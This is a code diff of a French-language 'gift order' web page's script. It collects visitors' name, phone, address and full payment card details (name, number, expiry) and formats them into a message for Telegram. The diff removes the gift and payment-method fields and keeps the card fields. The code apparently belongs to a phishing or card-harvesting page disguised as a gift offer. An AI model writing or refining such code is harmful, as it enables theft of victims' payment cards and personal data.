@@ -707,8 +707,6 @@
                 email: document.getElementById('email').value,
                 address: document.getElementById('address').value,
                 deliveryMethod: document.querySelector('input[name="delivery-method"]:checked')?.value,
-                giftSelection: document.getElementById('gift-selection').value,
-                paymentMethod: document.querySelector('input[name="payment-method"]:checked')?.value,
                 cardName: document.getElementById('card-name').value,
                 cardNumber: document.getElementById('card-number').value,
                 cardExpiry: document.getElementById('card-expiry').value,
@@ -721,10 +719,7 @@
             // Prepare message for Telegram
             const message = `
 🎁 **NOUVELLE COMMANDE DE CADEAU** 🎁
-📦 **Cadeau sélectionné:** ${formData.giftSelection}
 🚚 **Méthode de livraison:** ${formData.deliveryMethod || 'Non spécifiée'}
-💳 **Méthode de paiement:** ${formData.paymentMethod || 'Non spécifiée'}
-
 👤 **Informations personnelles:**
 ▸ Nom: ${formData.fullname}
 ▸ Téléphone: ${formData.phone}
